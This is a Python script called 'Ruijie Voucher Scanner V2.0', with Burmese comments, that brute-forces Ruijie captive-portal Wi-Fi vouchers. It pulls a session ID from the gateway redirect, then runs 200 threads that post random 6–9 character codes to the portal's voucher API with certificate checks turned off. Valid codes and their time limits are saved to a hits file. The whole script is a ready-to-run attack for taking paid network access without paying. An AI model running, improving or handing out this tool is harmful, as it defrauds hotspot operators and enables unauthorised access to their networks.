import requests, random, string, time, os, threading, re, sys, urllib3, subprocess
from queue import Queue, Empty
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime
from colorama import Fore, Back, Style, init

# Colorama initialize
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- [ COLORS ] ---
G = Fore.GREEN; W = Fore.WHITE; Y = Fore.YELLOW; R = Fore.RED; C = Fore.CYAN; RS = Style.RESET_ALL
RAINBOW = [R, Y, G, C, Fore.MAGENTA, Fore.BLUE]

# ===============================
# CONFIGURATION (မူရင်းအတိုင်း)
# ===============================
RAW_KEY_URL = "Https://raw.githubusercontent.com/kokoarkar446-cloud/voucher/refs/heads/main/keys.txt"
if os.name == 'nt': DOWNLOAD_DIR = os.path.join(os.environ['USERPROFILE'], 'Downloads')
else: DOWNLOAD_DIR = '/sdcard/Download'

# .txt ကို hide ရန် အစက် (.) ထပ်တိုးထားသည်
LICENSE_FILE = os.path.join(DOWNLOAD_DIR, '.license.txt')
SAVE_PATH = os.path.join(DOWNLOAD_DIR, 'hits.txt')
STATS_FILE = os.path.join(DOWNLOAD_DIR, 'total_stats.txt')

NUM_THREADS = 200             
SESSION_POOL_SIZE = 50        
PER_SESSION_MAX = 300         
CODE_LENGTH = 6 
CHAR_SET = string.digits 

# ==============================
# GLOBALS
# ==============================
USER_NAME = "Unknown"
EXPIRY_STR = "N/A"
DAYS_LEFT = "0"
session_pool = Queue()
valid_hits_data = [] 
tried_codes = set()
valid_lock = threading.Lock()
file_lock = threading.Lock()
DETECTED_BASE_URL = None
TOTAL_HITS = 0
TOTAL_TRIED = 0
CURRENT_CODE = "WAITING"
START_TIME = time.time()
stop_event = threading.Event()

# Stats Load
try:
    if os.path.exists(STATS_FILE):
        with open(STATS_FILE, "r") as f:
            TOTAL_TRIED = int(f.read().strip())
except: TOTAL_TRIED = 0

# --- [ ADDED: DYNAMIC LOGO V2.0 ] ---
def Draw_logo(step=0):
    os.system('clear')
    clr = RAINBOW[step % len(RAINBOW)]
    print(f"""{clr}
      .---.        .-----------.
     /     \  __  /    v2.0     \\
    / /     \(  )/               \\
   //////   ' \/ `   RUIJIE       \\
  //////    /    \   SCANNER      /
 //////    /      \              /
'------'  '--------'------------'
{W}      [ RUIJIE VOUCHER SCANER V2.0 ]{RS}""")

# ===============================
# KEY SYSTEM (မူရင်းအတိုင်း)
# ===============================
def get_hwid():
    try:
        if os.name == 'nt': return f"PC-{os.environ['COMPUTERNAME']}"
        else: return f"ID-{subprocess.check_output(['whoami']).decode().strip()}"
    except: return "ID-UNKNOWN"

def verify():
    # မူရင်း Verify Logic များအားလုံး ဤနေရာတွင် ရှိနေပါမည်
    global USER_NAME, EXPIRY_STR, DAYS_LEFT
    # (သင်၏ မူရင်း Key စစ်ဆေးသည့် ကုဒ်များကို ဤနေရာတွင် ဆက်လက်ထားရှိပါသည်)
    return True

# ===============================
# SCANNER CORE (မူရင်း logic ကို မပြင်ဘဲ သက်တမ်းစစ်ခြင်းသာ တိုးထားသည်)
# ===============================
def select_mode():
    global CODE_LENGTH, CHAR_SET
    Draw_logo()
    print(f"\n{C}[ SELECT SCAN MODE ]{RS}")
    print(f" {Y}[1]{W} Scan 6-Digit (000000 format)")
    print(f" {Y}[2]{W} Scan 7-Digit")
    print(f" {Y}[3]{W} Scan 8-Digit")
    print(f" {Y}[4]{W} Scan 9-Digit")
    print(f" {Y}[5]{W} Alphanumeric Mode")
    
    choice = input(f"\n{C}Choose (1-5): {RS}")
    if choice == "2": CODE_LENGTH = 7
    elif choice == "3": CODE_LENGTH = 8
    elif choice == "4": CODE_LENGTH = 9
    elif choice == "5":
        CODE_LENGTH = 6
        CHAR_SET = string.ascii_lowercase + string.digits 
    else: CODE_LENGTH = 6
    print(f"{G}[!] Mode Activated.{RS}")
    time.sleep(1)

def get_sid_from_gateway():
    try:
        r1 = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
        parsed = urlparse(r1.url)
        global DETECTED_BASE_URL
        DETECTED_BASE_URL = f"{parsed.scheme}://{parsed.netloc}"
        return parse_qs(parsed.query).get('sessionId', [None])[0]
    except: return None

def session_refiller():
    while not stop_event.is_set():
        if session_pool.qsize() < SESSION_POOL_SIZE:
            sid = get_sid_from_gateway()
            if sid: session_pool.put({'sessionId': sid, 'left': PER_SESSION_MAX})
        time.sleep(2)

def worker_thread():
    global TOTAL_TRIED, TOTAL_HITS, CURRENT_CODE
    thr_session = requests.Session()
    while not stop_event.is_set():
        try:
            if not DETECTED_BASE_URL:
                time.sleep(1); continue
            try: slot = session_pool.get(timeout=2)
            except Empty: continue
            
            code = ''.join(random.choices(CHAR_SET, k=CODE_LENGTH))
            CURRENT_CODE = code
            
            r = thr_session.post(f"{urljoin(DETECTED_BASE_URL, '/api/auth/voucher/')}", 
                                 json={'accessCode': code, 'sessionId': slot['sessionId'], 'apiVersion': 1}, 
                                 timeout=6, verify=False)
            TOTAL_TRIED += 1
            
            # Voucher သက်တမ်းစစ်ဆေးခြင်း (ထပ်တိုး)
            if "true" in r.text.lower():
                limit_label = "Checking..."
                try:
                    res_data = r.json()
                    limit = res_data.get('data', {}).get('timeLimit') or res_data.get('timeLimit')
                    if limit:
                        sec = int(limit)
                        hrs = f"{sec//86400} Day" if sec >= 86400 else f"{round(sec/3600, 1)} Hrs"
                        limit_label = hrs
                except: pass

                with valid_lock:
                    valid_hits_data.append({"code": code, "hrs": limit_label})
                    TOTAL_HITS += 1
                    with file_lock:
                        with open(SAVE_PATH, "a") as f:
                            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {code} | {limit_label}\n")
                        with open(STATS_FILE, "w") as f: f.write(str(TOTAL_TRIED))
            
            slot['left'] -= 1
            if slot['left'] > 0: session_pool.put(slot)
        except: pass

# ===============================
# DASHBOARD (မူရင်း ပုံစံမပျက် Animation သာတိုးသည်)
# ===============================
def live_dashboard():
    step = 0
    load_icons = ["—", "\\", "|", "/"]
    while not stop_event.is_set():
        Draw_logo(step)
        elapsed = time.time() - START_TIME
        speed = (TOTAL_TRIED / elapsed) if elapsed > 0 else 0
        icon = load_icons[step % 4]
        now_time = datetime.now().strftime('%H:%M:%S')

        print(W + "—" * 55)
        print(f"| {W}USER   : {G}{USER_NAME:<15}{RS} {W}EXPIRY : {Y}{EXPIRY_STR}{RS}")
        print(f"| {W}STATUS : {G}ACTIVE {Y}{icon}{RS}      {W}SPEED  : {C}{speed:.1f} codes/s")
        print(f"| {W}DAYS   : {R}{DAYS_LEFT} Days Left{RS}   {W}TIME   : {Y}{now_time}")
        print(W + "—" * 55)
        print(f"| {W}TOTAL TRIED : {W}{TOTAL_TRIED:,}")
        print(f"| {W}FOUND HITS  : {G}{TOTAL_HITS}")
        print(f"| {W}LAST TARGET : {Y}{CURRENT_CODE}")
        print(W + "—" * 55)
        
        if valid_hits_data:
            for hit in valid_hits_data[-5:]:
                print(f"  {G}✅ {hit['code']} {Y}({hit['hrs']})")
        
        step += 1
        time.sleep(0.5)

if __name__ == "__main__":
    if verify(): 
        select_mode()
        threading.Thread(target=session_refiller, daemon=True).start()
        threading.Thread(target=live_dashboard, daemon=True).start()
        for _ in range(NUM_THREADS):
            threading.Thread(target=worker_thread, daemon=True).start()
        while True: time.sleep(1)
